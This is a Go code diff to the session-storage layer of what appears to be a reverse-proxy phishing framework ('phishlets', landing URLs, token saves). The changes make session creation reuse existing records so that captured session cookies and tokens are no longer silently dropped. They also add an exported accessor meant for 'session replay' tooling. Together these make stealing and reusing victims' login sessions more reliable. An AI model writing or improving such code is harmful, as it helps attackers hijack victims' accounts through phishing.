@@ -42,10 +42,30 @@ func (d *Database) sessionsInit() {
 	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
 }
 
+// sessionsLookup performs a raw (non-mutating) existence check for sid. Used by
+// sessionsCreate to detect duplicates and by sessionsGetBySid as the read half of
+// an upsert. It never creates records.
+func (d *Database) sessionsLookup(sid string) (*Session, bool) {
+	s := &Session{}
+	found := false
+	_ = d.db.View(func(tx *buntdb.Tx) error {
+		return tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
+			_ = json.Unmarshal([]byte(val), s)
+			found = true
+			return false
+		})
+	})
+	return s, found
+}
+
 func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
-	_, err := d.sessionsGetBySid(sid)
-	if err == nil {
-		return nil, fmt.Errorf("session already exists: %s", sid)
+	// Idempotent: if a session with this sid already exists (visitor revisited
+	// the landing URL, or a prior CreateSession partially persisted), reuse it
+	// instead of erroring. Returning an error here made the proxy proceed with a
+	// session that had no DB record, which later produced "session not found" on
+	// every token save and silently dropped cookies.
+	if s, found := d.sessionsLookup(sid); found {
+		return s, nil
 	}
 
 	id, _ := d.getNextId(SessionTable)
@@ -71,7 +91,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 
 	jf, _ := json.Marshal(s)
 
-	err = d.db.Update(func(tx *buntdb.Tx) error {
+	err := d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
 		return nil
 	})
@@ -251,4 +271,9 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 		return nil, err
 	}
 	return s, nil
+}
+
+// GetSessionBySid is the exported accessor for session replay/open tooling.
+func (d *Database) GetSessionBySid(sid string) (*Session, error) {
+	return d.sessionsGetBySid(sid)
 }
